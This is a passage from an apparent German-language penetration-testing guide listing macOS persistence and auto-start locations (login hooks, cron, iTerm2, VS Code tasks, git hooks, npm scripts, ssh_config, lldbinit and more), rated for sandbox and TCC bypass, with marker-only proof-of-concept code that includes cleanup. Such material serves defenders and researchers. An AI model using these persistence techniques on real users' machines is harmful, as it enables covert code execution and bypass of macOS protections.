Du kannst ein eigenes QuickLook-Plugin kompilieren, es an einem der oben genannten Speicherorte ablegen, damit es geladen wird, und anschließend eine unterstützte Datei auswählen und die Leertaste drücken, um es auszulösen.

Diese Pfade beziehen sich auf ältere `.qlgenerator`-Bundles; Apples [Architekturleitfaden zu Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) dokumentiert die Suchreihenfolge und die passenden Dateitypen. Aktuelle Quick Look-**App-Erweiterungen** werden mit einer App gebündelt und haben andere Registrierungs- und Ausführungsregeln. Dass ein Generator vorhanden ist, bedeutet nicht, dass er bei der Typauswahl bevorzugt wird oder sein Code direkt im Finder ausgeführt wird. Der Pfad für ältere Generatoren wurde anhand der Dokumentation und des Vorhandenseins des Verzeichnisses überprüft; auf dem Forschungs-Mac war kein Generator installiert oder geladen.

### ~~Login-/Logout-Hooks~~

> [!CAUTION]
> Das hat bei mir nicht funktioniert, weder mit dem LoginHook des Benutzers noch mit dem LogoutHook von root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Du musst etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` ausführen können
  - Befindet sich in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Um es zu löschen:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Der Eintrag für den **root**-Benutzer wird unter **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Conditional Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und es dir ermöglichen, etwas einfach auszuführen, indem du es **in eine Datei schreibst** und auf eher ungewöhnliche Bedingungen setzt, z. B. bestimmte **installierte Programme**, Aktionen von **„ungewöhnlichen“ Benutzern** oder bestimmte Umgebungen.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nützlich für sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Allerdings musst du die `crontab`-Binary ausführen können.
  - Oder root sein.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/usr/lib/cron/tabs/`**
  - Für direkten Schreibzugriff ist root erforderlich. Kein root erforderlich, wenn du `crontab <file>` ausführen kannst.
  - **Auslöser**: Der Zeitplan in der installierten crontab. `at` und `periodic` sind separate Mechanismen, die weiter unten beschrieben werden.

#### Beschreibung & Ausnutzung

Liste die Cron-Jobs des **aktuellen Benutzers** mit:

```bash
crontab -l
```

Der launchd-plist des systemweiten cron-Daemons enthält einen `QueueDirectories`-Eintrag für `/usr/lib/cron/tabs`; dort werden installierte Benutzer-crontabs gespeichert. Zum Untersuchen der crontabs anderer Benutzer sind Root-Rechte erforderlich:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In einem entbehrlichen Benutzerkonto kann mit `crontab` ein Cron-Eintrag gesetzt werden, der nur als Marker dient, und nach der Beobachtung wieder entfernt werden. `crontab <file>` **ersetzt die gesamte vorhandene Crontab des Kontos**. Speichern Sie sie daher vorher und stellen Sie sie anschließend wieder her, wenn das Konto nicht entbehrlich ist:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 waren früher TCC-Berechtigungen gewährt

#### Speicherorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Auslöser**: iTerm2 mit einem geeigneten Python-API-Skript in diesem Ordner starten
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Auslöser**: iTerm2 starten; der AppleScript-Startup-Hook ist separat dokumentiert
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Auslöser**: Eine Sitzung mit dem Profil erstellen, dessen Befehl oder initialer Text die Payload aufruft

#### Beschreibung & Ausnutzung

Der [aktuelle iTerm2-Python-API-Leitfaden](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumentiert automatisch ausgeführte **Python**-Skripte in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Er belegt nicht, dass eine beliebige ausführbare `.sh`-Datei in diesem Ordner ausgeführt wird. Speichere dies für ein entbehrliches Konto als `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Der [aktuelle AppleScript-Leitfaden für iTerm2](https://iterm2.com/documentation-scripting.html) dokumentiert separat `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` sowie einen Fallback auf `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, wenn der moderne Ordner nicht existiert. Ein AppleScript, das nur einen Marker setzt, sieht so aus:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Diese Skriptbeispiele wurden anhand der Dokumentation von iTerm2 überprüft und nicht in einer aktiven Desktop-Sitzung ausgeführt. Entfernen Sie nach dem Testen in einem Wegwerfaccount das Testskript und jeweils `/tmp/ht-iterm-autolaunch-marker` oder `/tmp/iterm2-autolaunchscpt`.

In den iTerm2-Einstellungen unter **`~/Library/Preferences/com.googlecode.iterm2.plist`** können ein Profilbefehl oder ein initialer Text festgelegt werden. Letzterer wird in eine Sitzung eingegeben; seine Ausführung hängt davon ab, ob eine Shell ihn interpretiert. [Die Dokumentation zu iTerm2-Profilen](https://iterm2.com/documentation-preferences-profiles-general.html) beschreibt den Befehl, der ausgeführt wird, wenn eine neue Sitzung mit diesem Profil erstellt wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Der Befehl wird in den Einstellungen angezeigt:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Für eine sichere Untersuchung kannst du das ausgewählte Profil in den iTerm2-Einstellungen prüfen oder eine Kopie seiner Einstellungsdatei auslesen. Eine Änderung von `Initial Text` in einem aktiven Profil würde sich auf die Sitzungen eines Benutzers auswirken. Daher wurden auf dem Research-Mac keine Einstellungen geändert.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - xbar muss jedoch installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Das Programm fordert Bedienungshilfen-Berechtigungen an

#### Speicherort

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Auslöser**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, kann ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** geschrieben werden, das beim Start von xbar ausgeführt wird:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Hammerspoon muss jedoch installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Die App fordert Bedienungshilfen-Berechtigungen an

#### Speicherort

- **`~/.hammerspoon/init.lua`**
  - **Auslöser**: Sobald Hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und nutzt dafür die Skriptsprache **LUA**. Besonders hervorzuheben ist, dass sich vollständiger AppleScript-Code integrieren und Shell-Skripte ausführen lassen, wodurch die Skriptfunktionen erheblich erweitert werden.<sup>[[13]](#references)</sup>

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`. Beim Start wird das Skript ausgeführt.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - BetterTouchTool muss jedoch installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Die App fordert Berechtigungen für Automation-Shortcuts und Bedienungshilfen an

#### Speicherort

- Eine Skriptdatei, auf die in einem aktivierten BetterTouchTool-Preset **bereits verwiesen wird**, oder die Konfiguration dieses Presets unter `~/Library/Application Support/BetterTouchTool/`. Der genaue Skriptpfad hängt davon ab, wie das Preset konfiguriert wurde.

[BetterTouchTools Aktionsreferenz](https://docs.folivora.ai/docs/actions/action-definitions/) dokumentiert Shell-Skript- und Hintergrundbefehlsaktionen. Das konfigurierte Tastatur-, Maus-, Touch-, Widget- oder sonstige Ereignis muss eintreten, während das entsprechende Preset aktiv ist; [die Trigger-Anleitung](https://docs.folivora.ai/docs/configuration/new-trigger/) zeigt diese Zuordnung. Eine beliebige Datei im Application-Support-Verzeichnis löst nichts aus. Eine bereits konfigurierte Aktion, die ein externes, beschreibbares Skript lädt, ist ein enger umrissenes Ziel, bei dem Schreibzugriff zur Ausführung führen kann. Der Code läuft mit dem Benutzerkonto von BetterTouchTool und unterliegt den tatsächlich erteilten macOS-Berechtigungen. BetterTouchTool war auf dem Research-Mac nicht in `/Applications` vorhanden, daher wurde lokal kein Preset geändert oder ausgeführt.

### Alfred

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Alfred muss jedoch installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Die App fordert Berechtigungen für Automation, Bedienungshilfen und sogar Festplattenvollzugriff an

#### Speicherort

- Ein Skript oder eine Datei, auf das bzw. die in einem installierten Alfred-Workflow **bereits verwiesen wird**, oder dieser Workflow im konfigurierten `Alfred.alfredpreferences`-Verzeichnis des Benutzers. Das Einstellungsverzeichnis kann synchronisiert sein und befindet sich nicht an einem einheitlichen, festgelegten Pfad.

[Alfreds Workflow-Anleitung](https://www.alfredapp.com/help/workflows/) beschreibt die Powerpack-Voraussetzung und die Installation über die Benutzeroberfläche. Ein Hotkey, ein Schlüsselwort oder ein anderer konfigurierter Trigger eines installierten Workflows muss ausgelöst werden; [Alfreds Hotkey-Beispiel](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) zeigt eine Skriptaktion. [Alfreds Umgebungsreferenz](https://www.alfredapp.com/help/workflows/script-environment-variables/) stellt den ausgewählten Einstellungspfad als `alfred_preferences` bereit. Das Ablegen einer nicht registrierten Workflow-Datei in einem beliebigen Verzeichnis belegt nicht, dass sie installiert oder ausgeführt wird. Der Code läuft als der angemeldete Alfred-Benutzer und unterliegt den tatsächlich erteilten macOS-Berechtigungen. Alfred war auf dem Research-Mac nicht in `/Applications` vorhanden, daher wurde dieser Pfad ausschließlich anhand der Dokumentation bewertet.

### Raycast-Skriptbefehle und Aktualisierung von Erweiterungen

- **Schreibziel:** Ein ausführbares Skript in einem Verzeichnis, das unter Raycast Settings → Script Commands **bereits hinzugefügt wurde**. Raycast durchsucht kein beliebiges neu erstelltes Verzeichnis. [Raycasts Anleitung zu Script Commands](https://manual.raycast.com/script-commands) beschreibt die Registrierung von Verzeichnissen.
- **Auslöser und Identität:** Ein Benutzer ruft den indizierten Befehl auf, ein konfigurierter Hotkey oder Fallback löst ihn aus, oder Raycast aktualisiert ein `inline`-Skript anhand seines konfigurierten `@raycast.refreshTime`. Das Skript läuft als angemeldeter Raycast-Benutzer über dessen Interpreter. Die [Metadatenreferenz des Upstream-Projekts](https://github.com/raycast/script-commands#metadata) beschränkt die automatische Aktualisierung auf Inline-Befehle, und [Raycasts Erweiterungsmanifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) unterstützt separat ein `interval` für installierte Erweiterungsbefehle vom Typ `no-view` oder `menu-bar`. Das bloße Hinzufügen eines normalen Skriptbefehls plant keine Ausführung.

Für ein Wegwerf-Konto mit einem registrierten Skriptverzeichnis sieht ein Inline-Skript, das lediglich eine Markierung schreibt, wie folgt aus:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Speichere es im registrierten Verzeichnis, mache es ausführbar und lass Raycast eine Aktualisierung durchführen. Entferne dann diese Datei und `/tmp/ht-raycast-refresh-marker`. Raycast wurde auf dem Research-Mac nicht unter seinem üblichen Namen in `/Applications` gefunden, daher ist dies durch Dokumentation belegt und wurde nicht lokal ausgeführt. Für Bedienungshilfen, Automation und Dateien gelten weiterhin die macOS-Berechtigungsabfragen.

### Automatische Workspace-Tasks in Visual Studio Code

- **Schreibziel:** `.vscode/tasks.json` in einem Workspace, den der Benutzer öffnen wird.
- **Auslöser:** Öffnen dieses Workspace in VS Code, aber nur, wenn dem Ordner vertraut wird **und** automatische Tasks zugelassen wurden. Ein nicht vertrauenswürdiger Workspace führt niemals automatische Tasks aus; die Standardeinstellung fordert den Benutzer vor der ersten automatischen Ausführung zur Bestätigung auf. Sowohl die [VS Code-Task-Dokumentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) als auch die [Dokumentation zu Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) beschreiben diese beiden Bedingungen.
- **Ausführungsidentität:** Das Konto des VS-Code-Benutzers über den konfigurierten Task-Prozess. Dies ist eine anwendungsspezifische Ausführung, keine Login-Persistenz.

Lege in einem **neuen, entbehrlichen Workspace** diese Task an, die nur eine Markierung schreibt, und speichere sie in `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nach dem Öffnen des vertrauenswürdigen Arbeitsbereichs und dem Zulassen automatischer Tasks prüfen Sie, ob `.autostart-task-ran` vorhanden ist. Entfernen Sie den Task-Eintrag und die Markierungsdatei, um aufzuräumen. **Dies wurde anhand der Dokumentation von Microsoft und des installierten VS-Code-1.139.1-Bundles überprüft; es wurde nicht in der aktiven Desktop-Sitzung ausgeführt.**

### Chrome Native Messaging Hosts

- **Schreibziel:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` für den aktuellen Benutzer oder `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` für alle Benutzer (Schreibrechte für Administratoren erforderlich). Chromium und Chrome for Testing verwenden unterschiedliche Verzeichnisse; siehe [Chromes aktuelle Pfadübersicht](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Auslöser:** Eine installierte Chrome-Erweiterung mit der Berechtigung `nativeMessaging` ruft `chrome.runtime.connectNative()` oder `chrome.runtime.sendNativeMessage()` mit dem exakten Host-Namen aus dem Manifest auf. Chrome startet dann die Host-Datei. Das Öffnen von Chrome allein führt keinen beliebigen neuen Native Host aus; das Erstellen eines Manifests ohne aufrufende Erweiterung bewirkt nichts. [Chromes Native-Messaging-Leitfaden](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) beschreibt diesen Handshake.
- **Ausführungsidentität:** Das Konto des Chrome-Benutzers. Im Manifest muss ein absoluter Pfad zur ausführbaren Datei angegeben und der Ursprung der aufrufenden Erweiterung ausdrücklich zugelassen werden.

In einem entbehrlichen Browserkonto mit einer Test-Erweiterung demonstriert das folgende Dateipaar die Verbindung zwischen Schreibzugriff und Ausführung. Der Dateiname des Manifests muss mit seinem `name` übereinstimmen, und `TEST_EXTENSION_ID` muss durch die tatsächliche ID dieser Erweiterung ersetzt werden:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Speichern Sie dieses JSON unter `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Die ausschließlich als Marker dienende ausführbare Datei im `path` des Manifests kann Folgendes enthalten:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nachdem die Test-Extension über ihren Service Worker oder ihre Extension-Seite `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` aufruft, belegt der Marker, dass der Host gestartet wurde. Dieser minimale Host implementiert das längenpräfixierte Antwortprotokoll von Chrome nicht, daher meldet die Extension möglicherweise einen Messaging-Fehler, nachdem der Marker geschrieben wurde. Entferne zum Aufräumen das Test-Manifest, den Host und den Marker. Unter macOS 26.5.2 waren die Chrome-App und beide Manifest-Verzeichnisse vorhanden; **das aktive Chrome-Profil wurde nicht geändert oder verwendet**.

### Karabiner-Elements-Tastenereignis-Befehle

- **Schreibziel:** `~/.config/karabiner/karabiner.json` in einem Konto, in dem Karabiner-Elements installiert ist und läuft. [Karabiners Anleitung zu Dateispeicherorten](https://karabiner-elements.pqrs.org/docs/json/location/) besagt, dass die App diese Datei überwacht und nach einem Schreibvorgang neu lädt. JSON-Dateien in `assets/complex_modifications` sind nur importierbare Voreinstellungen; das bloße Ablegen einer Datei dort aktiviert keine Regel.
- **Auslöser:** Das konfigurierte Tastenereignis, nachdem die Regel aktiviert wurde. Die Referenz zu [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) beschreibt die Befehlsausführung. Dies ist keine Codeausführung bei der Anmeldung oder bei jedem Schreibvorgang in eine Datei.
- **Ausführungsidentität:** Der angemeldete Benutzer, unter dem Karabiners Benutzerprozess läuft. Die eigenen Berechtigungsfreigaben und ein möglicher TCC-Zugriff hängen von App und Version ab.

Füge für ein entbehrliches Testkonto dieses Regelobjekt zum Array `complex_modifications.rules` des ausgewählten Profils in `karabiner.json` hinzu und erhalte den übrigen Inhalt des Profils. Drücke F18, um einen harmlosen Marker zu erstellen, und entferne anschließend diese Regel und den Marker. F18 ersetzt keinen gewöhnlichen Tastenanschlag:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements war auf dem Testrechner mit macOS 26.5.2 nicht in `/Applications` installiert. Daher handelt es sich um einen durch Dokumentation belegten PoC und nicht um ein lokales Laufzeitergebnis.

### Git-Hooks in einem lokalen Repository

- **Schreibziel:** Ein ausführbarer Hook wie `<repo>/.git/hooks/post-checkout`. Falls `core.hooksPath` bereits festgelegt wurde, verwende stattdessen das konfigurierte Verzeichnis. Ein als gewöhnliche getrackte Quelldatei committeter Hook wird nicht automatisch in einem Clone installiert.
- **Auslöser:** Der entsprechende Git-Vorgang. `post-checkout` wird beispielsweise nach `git checkout` oder `git switch` ausgeführt und kann auch nach dem Klonen oder Erstellen eines Worktrees ausgeführt werden. [Git's Hook-Referenz](https://git-scm.com/docs/githooks) listet die Ereignisse und die erforderliche Ausführungsberechtigung auf; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) ändert das Verzeichnis, in dem nach Hooks gesucht wird.
- **Ausführungsidentität:** Das Konto, unter dem Git ausgeführt wird. Der Hook kann nur ausgeführt werden, wenn das effektive Hooks-Verzeichnis des Repositorys für den Akteur beschreibbar ist und der Benutzer später den entsprechenden Git-Vorgang durchführt.

Dieser ausschließlich Markierungen erzeugende PoC erstellt ein vollständig entbehrliches Repository, installiert einen Hook und wechselt den Branch. Er wurde erfolgreich mit Apple Git 2.50.1 unter macOS 26.5.2 ausgeführt:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm-Lifecycle-Skripte in einem Projekt

- **Schreibziel:** Die `scripts`-Map in der `package.json` eines beschreibbaren Projekts oder ein installiertes Dependency-Paket, dessen Lifecycle-Skript der Benutzer ausführen wird. Dies ist ein Hook im Entwicklungsworkflow und wird nicht dadurch ausgeführt, dass ein Verzeichnis geöffnet wird.
- **Auslöser und Identität:** Ein späteres `npm install` oder `npm ci` führt bei erlaubten Lifecycle-Skripten `preinstall`, `install` und `postinstall` als der Benutzer aus, der npm aufruft. Ein gewöhnliches `npm run <name>` führt außerdem passende `pre<name>`- und `post<name>`-Skripte aus. [Die Lifecycle-Referenz von npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) listet die Ereignisse auf; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) kann Install-Lifecycle-Skripte unterdrücken. Versions- und Richtlinieneinstellungen können beeinflussen, was erlaubt ist. Prüfe daher die npm-Version auf dem Zielsystem.

Dieser PoC, der nur einen Marker schreibt, wurde mit lokalem npm in einem temporären, leeren Verzeichnis ausgeführt. Er lädt keine Dependencies herunter und ändert kein Benutzerprojekt:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Dies unterscheidet sich von Python-Interpreter-Startdateien: npm muss die entsprechende Installations- oder Ausführungsaktion durchführen, während Python-`site`-Code bei einem gewöhnlichen Interpreter-Aufruf geladen werden kann. Generische `Makefile`-Ziele und Build-Task-Definitionen erfordern ebenfalls, dass der Benutzer oder ein bereits konfiguriertes Tool das jeweilige Ziel aufruft; sie sind keine eigenständigen OS-Auto-Startpfade.

### Vim-Startkonfiguration

- **Schreibziel:** `~/.vimrc` für den Benutzer, der Vim starten wird (oder eine andere Startdatei, die Vim gemäß seiner Initialisierungsreihenfolge auswählt). [Vims Referenz zum Startverhalten](https://vimhelp.org/starting.txt.html) dokumentiert die Datei und die Überschreibungen `VIMINIT`/`EXINIT`.
- **Auslöser:** Ein nachfolgender gewöhnlicher Vim-Start, bei dem diese Konfiguration geladen wird. Vims `-u NONE` umgeht die benutzerspezifische vimrc. Dies ist eine editorspezifische Ausführung, kein OS-Login-Auslöser.
- **Ausführungsidentität:** Das Konto des Vim-Benutzers.

Der folgende isolierte PoC wurde mit macOS’ `/usr/bin/vim` ausgeführt; er schreibt keine echten Vim-Einstellungen oder geöffneten Dokumente:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim hat einen separaten Pfad für die Benutzerkonfiguration, `$XDG_CONFIG_HOME/nvim/init.lua` oder `init.vim`, und lädt laut seiner [Startdokumentation](https://neovim.io/doc/user/starting/) außerdem Skripte aus den `plugin/`-Runtime-Verzeichnissen. Neovim war auf dem Testsystem mit macOS 26.5.2 nicht installiert, daher wurde diese Variante dort nicht ausgeführt.

### SSH-Client-Konfigurationsbefehle

- **Schreibziel:** `~/.ssh/config` oder eine andere Datei, die bereits eingebunden wird. Dies ist eine **Client**-Konfigurationsdatei; sie ist getrennt von der unten beschriebenen serverseitigen `~/.ssh/rc`.
- **Auslöser:** Ein passender `ssh`-Aufruf. `Match exec` führt einen lokalen Befehl aus, während der Client seine Konfiguration auswertet, auch bei `ssh -G`, das die Konfiguration ausgibt, ohne eine Verbindung herzustellen. `ProxyCommand` wird ausgeführt, wenn der Client eine passende Verbindung einrichtet. `LocalCommand` wird nur nach einer erfolgreichen Verbindung ausgeführt und erfordert `PermitLocalCommand yes` (standardmäßig `no`). Diese Befehle unterscheiden sich hinsichtlich Zeitpunkt und Voraussetzungen; ein Schreibvorgang allein führt sie nicht aus. Siehe die Upstream-[OpenSSH-Dokumentation zu `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Ausführungsidentität:** Der lokale Benutzer, der `ssh` ausführt. Ein passender Host, eine anwendbare Konfigurationsdatei und gegebenenfalls eine erforderliche Verbindung sind notwendig. Mit `ssh -F` lässt sich eine andere Konfigurationsdatei auswählen.

Dieser PoC, der lediglich einen Marker setzt, wurde mit Apples SSH-Client auf macOS 26.5.2 ausgeführt. `-G` testet `Match exec`, ohne eine Netzwerkverbindung herzustellen oder die echte SSH-Konfiguration des Benutzers einzulesen:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger-Initialisierungsdateien

- **Schreibziel:** `~/.lldbinit` oder eine Datei mit höherer Priorität und anwendungsspezifischem Namen, etwa `~/.lldbinit-lldb`. LLDB liest beim Start des Debuggers eine dieser Dateien. Eine `.lldbinit` im aktuellen Verzeichnis wird **nicht** standardmäßig ausgeführt; der Benutzer muss `target.load-cwd-lldbinit` aktivieren oder `--local-lldbinit` übergeben. Siehe das [LLDB-Handbuch](https://lldb.llvm.org/man/lldb.html).
- **Auslöser und Identität:** Der Benutzer startet LLDB ohne `--no-lldbinit`; Befehle werden als dieser Benutzer ausgeführt. Allein das Öffnen eines Projekts bedeutet nicht, dass dessen `.lldbinit` ausgeführt wird.

Der folgende Marker-only-Test wurde mit LLDB unter macOS 26.5.2 und einem isolierten Home-Verzeichnis und Arbeitsverzeichnis durchgeführt:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB** listet die [Upstream-Startdokumentation](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) unter macOS `$HOME/Library/Preferences/gdb/gdbinit` und anschließend `~/.gdbinit` auf. Eine `.gdbinit` im aktuellen Verzeichnis unterliegt dem [Auto-Load-Safe-Path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), und `-nx`/`-nh` unterdrücken Initialisierungsdateien. GDB war auf dem Test-Mac nicht installiert, daher wurde diese Variante lokal nicht ausgeführt.

### SSHRC

Write-up: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Dafür muss ssh aktiviert und verwendet werden
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH-Nutzung, um FDA-Zugriff zu erhalten

#### Speicherort

- **`~/.ssh/rc`**
  - **Auslöser**: Anmeldung via ssh
- **`/etc/ssh/sshrc`**
  - Root erforderlich
  - **Auslöser**: Anmeldung via ssh

> [!CAUTION]
> Zum Aktivieren von ssh ist Full Disk Access erforderlich:
>
> ```bash
